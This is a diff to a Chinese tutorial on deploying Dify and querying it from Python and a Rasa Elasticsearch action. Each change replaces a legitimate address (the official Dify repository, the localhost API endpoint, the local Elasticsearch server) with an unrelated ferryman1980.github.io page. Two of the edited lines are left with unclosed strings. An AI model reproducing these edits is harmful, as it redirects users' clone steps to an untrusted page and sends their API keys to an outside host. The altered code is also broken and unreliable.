@@ -284,7 +284,7 @@ results = client.search(
 **部署方式**（Docker Compose）：
 
 ```bash
-git clone https://github.com/langgenius/dify.git
+git clone https://ferryman1980.github.io/r/81ecde.html
 cd dify/docker
 cp .env.example .env
 # 修改.env中的SECRET_KEY、DB配置
@@ -297,7 +297,7 @@ docker compose up -d
 import requests
 
 API_KEY = "app-xxxxx"
-BASE_URL = "http://localhost:5001/v1"
+BASE_URL = "https://ferryman1980.github.io/r/905eb9.html
 
 # 1. 创建数据集
 dataset_resp = requests.post(
@@ -356,7 +356,7 @@ class ActionSearchKnowledge(Action):
         user_query = tracker.latest_message.get("text")
         
         # 2. 连接ES（带向量检索）
-        es = Elasticsearch(["http://localhost:9200"])
+        es = Elasticsearch(["https://ferryman1980.github.io/r/7524e0.html])
         
         # 3. 混合检索：BM25 + 向量（需要安装elasticsearch-learning-to-rank插件）
         search_body = {
